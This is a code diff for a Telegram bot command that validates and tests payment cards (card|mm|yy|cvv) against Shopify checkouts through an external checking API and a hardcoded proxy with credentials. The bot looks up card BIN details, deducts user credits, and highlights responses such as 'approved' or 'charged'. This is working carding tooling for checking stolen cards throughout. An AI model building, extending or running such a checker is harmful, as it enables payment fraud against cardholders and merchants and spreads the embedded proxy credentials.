@@ -2863,24 +2863,23 @@ async def mysites(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 
-import asyncio
-import aiohttp
-import json
 import re
+import json
+import aiohttp
+import asyncio
+import logging
 from html import escape
 from datetime import datetime
 from telegram import Update
 from telegram.constants import ParseMode
 from telegram.ext import ContextTypes
-from db import get_user, update_user, init_db
-import logging
+
+from db import get_user, update_user   # your db functions
+from bin import get_bin_info           # your BIN function
 
 logger = logging.getLogger(__name__)
 
-# --- Initialize DB ---
-asyncio.get_event_loop().run_until_complete(init_db())
-
-# --- User cooldowns ---
+# ===== Cooldowns =====
 user_cooldowns = {}
 
 async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
@@ -2902,18 +2901,6 @@ async def consume_credit(user_id: int) -> bool:
         return True
     return False
 
-import re
-import json
-import aiohttp
-import asyncio
-import logging
-from html import escape
-from telegram import Update
-from telegram.constants import ParseMode
-from telegram.ext import ContextTypes
-
-from db import get_user, update_user   # your db functions
-from bin import get_bin_info           # your BIN function
 
 # ===== API template =====
 API_CHECK_TEMPLATE = (
@@ -2922,6 +2909,7 @@ API_CHECK_TEMPLATE = (
     "&cc={card}"
     "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
 )
+
 
 # ===== Main Command =====
 async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -2942,13 +2930,23 @@ async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     card_input = context.args[0].strip()
 
+    # Validate card format
+    if not re.match(r"^\d{12,19}\|\d{2}\|\d{2,4}\|\d{3,4}$", card_input):
+        await update.message.reply_text(
+            "❌ Invalid card format. Use: <code>card|mm|yy|cvv</code>",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    # Fetch user data once
+    user_data = await get_user(user_id)
+
     # Consume credit
     if not await consume_credit(user_id):
         await update.message.reply_text("❌ You have no credits left.", parse_mode=ParseMode.HTML)
         return
 
     # Fetch user custom site URL
-    user_data = await get_user(user_id)
     custom_url = user_data.get("custom_url")
     if not custom_url:
         await update.message.reply_text(
@@ -2972,7 +2970,7 @@ async def process_card_check(user, card_input, custom_url, msg):
     try:
         cc = card_input.split("|")[0]
 
-        # --- BIN lookup (your exact logic, unchanged) ---
+        # --- BIN lookup ---
         try:
             bin_number = cc[:6]
             bin_details = await get_bin_info(bin_number)
@@ -2988,7 +2986,7 @@ async def process_card_check(user, card_input, custom_url, msg):
             bank_phone = bin_details.get("bank_phone", "N/A")
             bank_url = bin_details.get("bank_url", "N/A")
         except Exception as e:
-            logging.warning(f"BIN lookup failed for {bin_number}: {e}")
+            logger.warning(f"BIN lookup failed for {bin_number}: {e}")
             brand = issuer = card_type = card_level = card_length = luhn_check = bank_phone = bank_url = "N/A"
             country_name = "Unknown"
             country_flag = ""
@@ -3028,6 +3026,12 @@ async def process_card_check(user, card_input, custom_url, msg):
         gateway = data.get("Gateway", "Shopify")
         requester = f"@{user.username}" if user.username else str(user.id)
 
+        # 🔥 Enhance Response if success
+        display_response = escape(response_text)
+        success_keywords = ["thank you", "approved", "charged", "success"]
+        if any(word in response_text.lower() for word in success_keywords):
+            display_response = f"{escape(response_text)} ➤𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
+
         # Developer/branding
         DEVELOPER_NAME = "kคli liຖนxx"
         DEVELOPER_LINK = "https://t.me/Kalinuxxx"
@@ -3041,7 +3045,7 @@ async def process_card_check(user, card_input, custom_url, msg):
             f"{bullet_link} 𝐂𝐚𝐫𝐝       ➜ <code>{card_input}</code>\n"
             f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲   ➜ {escape(gateway)}\n"
             f"{bullet_link} 𝐀𝐦𝐨𝐮𝐧𝐭     ➜ {price} 💸\n"
-            f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞   ➜ <i>{escape(response_text)}</i>\n"
+            f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞   ➜ <i>{display_response}</i>\n"
             "――――――――――――――――\n"
             f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝      ➜ <code>{brand}</code>\n"
             f"{bullet_link} 𝐁𝐚𝐧𝐤       ➜ <code>{issuer}</code>\n"
@@ -3061,11 +3065,12 @@ async def process_card_check(user, card_input, custom_url, msg):
     except asyncio.TimeoutError:
         await msg.edit_text("❌ Error: API request timed out.", parse_mode=ParseMode.HTML)
     except Exception as e:
-        logging.exception("Error in process_card_check")
+        logger.exception("Error in process_card_check")
         await msg.edit_text(
             f"❌ Error: <code>{escape(str(e))}</code>",
             parse_mode=ParseMode.HTML
         )
+
 
 
 
